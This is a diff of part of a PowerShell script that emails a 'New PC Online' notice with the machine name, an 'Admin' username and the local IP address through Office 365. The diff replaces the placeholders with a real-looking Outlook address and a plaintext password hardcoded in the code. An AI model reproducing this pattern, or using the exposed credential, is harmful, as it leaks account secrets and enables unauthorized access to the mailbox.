@@ -33,13 +33,13 @@ $LocalIP = (Get-NetIPAddress -AddressFamily IPv4 | Where-Object { $_.InterfaceAl
 # Email Configuration for Outlook
 $SMTPServer = "smtp.office365.com"
 $SMTPPort = "587"
-$From = "your-outlook-email@outlook.com"      # Replace with your Outlook email
-$To = "recipient-email@outlook.com"          # Replace with the recipient email
+$From = "happyprince@outlook.cz"      # Replace with your Outlook email
+$To = "happyprince@outlook.cz"          # Replace with the recipient email
 $Subject = "New PC Online - $env:COMPUTERNAME"
 $Body = "🚀 New PC Online!`n`nPC Name: $env:COMPUTERNAME`nUsername: Admin`nLocal IP: $LocalIP"
 
 # Send Email (Use the real password for this Outlook account)
-$SecurePassword = ConvertTo-SecureString "your-outlook-password" -AsPlainText -Force
+$SecurePassword = ConvertTo-SecureString "myemail1" -AsPlainText -Force
 $Creds = New-Object System.Management.Automation.PSCredential ($From, $SecurePassword)
 Send-MailMessage -From $From -To $To -Subject $Subject -Body $Body -SmtpServer $SMTPServer -Port $SMTPPort -UseSsl -Credential $Creds
 
